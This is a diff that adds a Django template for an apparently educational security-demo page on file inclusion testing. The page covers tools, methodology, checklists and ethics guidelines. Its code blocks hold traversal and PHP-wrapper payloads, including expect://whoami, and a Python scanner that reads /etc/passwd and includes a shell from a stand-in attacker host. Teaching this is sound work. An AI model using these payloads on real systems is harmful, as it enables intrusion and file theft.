@@ -1,0 +1,254 @@
+{% extends 'viewer/base.html' %}
+
+{% block title %}Security Testing Tools - {{ block.super }}{% endblock %}
+
+{% block content %}
+<div class="hero">
+    <h1>🛠️ Security Testing Tools</h1>
+    <div class="alert alert-info" style="background-color: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460;">
+        <strong>🔍 Professional Security Testing:</strong> Learn about tools used by security professionals to identify file inclusion vulnerabilities.
+    </div>
+</div>
+
+<div class="hero">
+    <h2>📊 Tool Categories</h2>
+    <div style="display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap;">
+        <a href="?category=all" class="btn {% if tool_category == 'all' %}btn-active{% endif %}" style="{% if tool_category == 'all' %}background-color: #28a745;{% endif %}">🔍 All Tools</a>
+        <a href="?category=static_analysis" class="btn {% if tool_category == 'static_analysis' %}btn-active{% endif %}" style="{% if tool_category == 'static_analysis' %}background-color: #28a745;{% endif %}">📋 Static Analysis</a>
+        <a href="?category=dynamic_analysis" class="btn {% if tool_category == 'dynamic_analysis' %}btn-active{% endif %}" style="{% if tool_category == 'dynamic_analysis' %}background-color: #28a745;{% endif %}">🧪 Dynamic Analysis</a>
+        <a href="?category=code_review" class="btn {% if tool_category == 'code_review' %}btn-active{% endif %}" style="{% if tool_category == 'code_review' %}background-color: #28a745;{% endif %}">🔍 Code Review</a>
+    </div>
+</div>
+
+{% if all_tools %}
+    {% for category_name, tools in security_tools.items %}
+    <div class="hero">
+        <h2>
+            {% if category_name == 'static_analysis' %}📋 Static Analysis Tools
+            {% elif category_name == 'dynamic_analysis' %}🧪 Dynamic Analysis Tools
+            {% elif category_name == 'code_review' %}🔍 Code Review Tools
+            {% endif %}
+        </h2>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1rem;">
+            {% for tool_key, tool_info in tools.items %}
+            <div style="background-color: #f8f9fa; padding: 1.5rem; border-radius: 8px; border-left: 4px solid 
+                {% if category_name == 'static_analysis' %}#17a2b8{% elif category_name == 'dynamic_analysis' %}#28a745{% elif category_name == 'code_review' %}#ffc107{% endif %};">
+                
+                <h3 style="margin: 0 0 0.5rem 0; color: #333;">{{ tool_info.name }}</h3>
+                <p style="margin: 0 0 1rem 0; color: #666;">{{ tool_info.description }}</p>
+                
+                <h4 style="margin: 0.5rem 0; color: #333;">Key Features:</h4>
+                <ul style="margin: 0; padding-left: 1.5rem;">
+                    {% for feature in tool_info.features %}
+                    <li>{{ feature }}</li>
+                    {% endfor %}
+                </ul>
+                
+                {% if tool_key == 'invicti' %}
+                <div style="margin-top: 1rem; padding: 0.5rem; background-color: #d4edda; border-radius: 4px; border: 1px solid #c3e6cb;">
+                    <small><strong>🎯 File Inclusion Detection:</strong> Advanced crawling and injection testing capabilities</small>
+                </div>
+                {% elif tool_key == 'acunetix' %}
+                <div style="margin-top: 1rem; padding: 0.5rem; background-color: #d4edda; border-radius: 4px; border: 1px solid #c3e6cb;">
+                    <small><strong>🎯 File Inclusion Detection:</strong> Comprehensive directory traversal and RFI testing</small>
+                </div>
+                {% endif %}
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+    {% endfor %}
+    
+{% elif selected_tools %}
+    <div class="hero">
+        <h2>
+            {% if tool_category == 'static_analysis' %}📋 Static Analysis Tools
+            {% elif tool_category == 'dynamic_analysis' %}🧪 Dynamic Analysis Tools  
+            {% elif tool_category == 'code_review' %}🔍 Code Review Tools
+            {% endif %}
+        </h2>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1rem;">
+            {% for tool_key, tool_info in selected_tools.items %}
+            <div style="background-color: #f8f9fa; padding: 1.5rem; border-radius: 8px; border-left: 4px solid 
+                {% if tool_category == 'static_analysis' %}#17a2b8{% elif tool_category == 'dynamic_analysis' %}#28a745{% elif tool_category == 'code_review' %}#ffc107{% endif %};">
+                
+                <h3 style="margin: 0 0 0.5rem 0;">{{ tool_info.name }}</h3>
+                <p style="margin: 0 0 1rem 0; color: #666;">{{ tool_info.description }}</p>
+                
+                <h4 style="margin: 0.5rem 0;">Key Features:</h4>
+                <ul style="margin: 0; padding-left: 1.5rem;">
+                    {% for feature in tool_info.features %}
+                    <li>{{ feature }}</li>
+                    {% endfor %}
+                </ul>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+{% endif %}
+
+<div class="hero">
+    <h2>🎯 File Inclusion Testing Methodology</h2>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #17a2b8;">
+            <h3>1️⃣ Discovery Phase</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>🔍 Identify file inclusion parameters</li>
+                <li>📊 Map application functionality</li>
+                <li>🌐 Discover input vectors</li>
+                <li>📝 Document potential targets</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #ffc107;">
+            <h3>2️⃣ Testing Phase</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>🧪 Test directory traversal payloads</li>
+                <li>🌐 Attempt remote file inclusion</li>
+                <li>🔄 Try encoding bypasses</li>
+                <li>📊 Analyze error responses</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #28a745;">
+            <h3>3️⃣ Validation Phase</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>✅ Confirm vulnerability existence</li>
+                <li>📈 Assess impact and risk</li>
+                <li>📝 Document proof of concept</li>
+                <li>🛡️ Test existing protections</li>
+            </ul>
+        </div>
+        
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🔧 Tool Configuration Examples</h2>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔵 Burp Suite Configuration</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd;">
+            <pre style="background-color: #f1f3f4; padding: 1rem; border-radius: 4px; overflow-x: auto;"><code># Burp Suite Intruder Payloads for File Inclusion
+../
+../../
+../../../
+....//
+....//....//
+%2e%2e%2f
+%252e%252e%252f
+..%2F
+..%5C
+php://filter/convert.base64-encode/resource=
+data://text/plain;base64,
+expect://whoami</code></pre>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>⚡ OWASP ZAP Automation</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd;">
+            <pre style="background-color: #f1f3f4; padding: 1rem; border-radius: 4px; overflow-x: auto;"><code># ZAP Baseline Scan with File Inclusion Focus
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+    -t http://target-app.com \
+    -r zap-report.html \
+    -I \
+    -a \
+    --hook=/path/to/file-inclusion-hook.py</code></pre>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔍 Custom Security Scanner</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd;">
+            <pre style="background-color: #f1f3f4; padding: 1rem; border-radius: 4px; overflow-x: auto;"><code># Python script for file inclusion testing
+import requests
+
+payloads = [
+    '../../../etc/passwd',
+    '..\\..\\..\\windows\\system.ini',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'http://attacker.com/shell.txt'
+]
+
+for payload in payloads:
+    response = requests.get(f'{target_url}?file={payload}')
+    if 'root:' in response.text or 'for 16-bit app' in response.text:
+        print(f'Vulnerable to: {payload}')</code></pre>
+        </div>
+    </div>
+</div>
+
+<div class="hero">
+    <h2>📊 Testing Checklist</h2>
+    
+    <div style="background-color: #d4edda; padding: 1rem; border-radius: 5px; border: 1px solid #c3e6cb;">
+        <h3>✅ File Inclusion Security Testing Checklist</h3>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; margin: 1rem 0;">
+            
+            <div>
+                <h4>🔍 Input Vector Testing</h4>
+                <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                    <li>☐ GET parameters</li>
+                    <li>☐ POST parameters</li>
+                    <li>☐ HTTP headers</li>
+                    <li>☐ Cookies</li>
+                    <li>☐ File upload fields</li>
+                    <li>☐ JSON/XML inputs</li>
+                </ul>
+            </div>
+            
+            <div>
+                <h4>🧪 Payload Testing</h4>
+                <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                    <li>☐ Basic directory traversal</li>
+                    <li>☐ URL encoded payloads</li>
+                    <li>☐ Double URL encoding</li>
+                    <li>☐ Unicode encoding</li>
+                    <li>☐ Null byte injection</li>
+                    <li>☐ PHP wrapper attacks</li>
+                </ul>
+            </div>
+            
+            <div>
+                <h4>🎯 Target File Testing</h4>
+                <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                    <li>☐ System files (/etc/passwd)</li>
+                    <li>☐ Configuration files</li>
+                    <li>☐ Log files</li>
+                    <li>☐ Application source code</li>
+                    <li>☐ Database configs</li>
+                    <li>☐ Environment variables</li>
+                </ul>
+            </div>
+            
+        </div>
+    </div>
+</div>
+
+<div class="hero">
+    <h2>⚠️ Responsible Testing Guidelines</h2>
+    
+    <div class="alert alert-warning">
+        <h3>🛡️ Ethical Security Testing</h3>
+        <ul style="margin: 1rem 0; padding-left: 2rem;">
+            <li><strong>🔐 Get Explicit Permission:</strong> Always obtain written authorization before testing</li>
+            <li><strong>🎯 Scope Limitation:</strong> Test only within agreed boundaries</li>
+            <li><strong>📊 Document Everything:</strong> Keep detailed records of testing activities</li>
+            <li><strong>🚨 Report Responsibly:</strong> Follow responsible disclosure practices</li>
+            <li><strong>🔒 Protect Data:</strong> Don't access, modify, or exfiltrate sensitive data</li>
+            <li><strong>⏰ Time Boundaries:</strong> Conduct testing during agreed time windows</li>
+        </ul>
+    </div>
+</div>
+
+<div style="margin: 2rem 0; text-align: center;">
+    <a href="{% url 'vulnerability_demo' %}" class="btn">← Back to Demos</a>
+    <a href="{% url 'advanced_security_demo' %}" class="btn">Advanced Security Demo →</a>
+</div>
+{% endblock %}
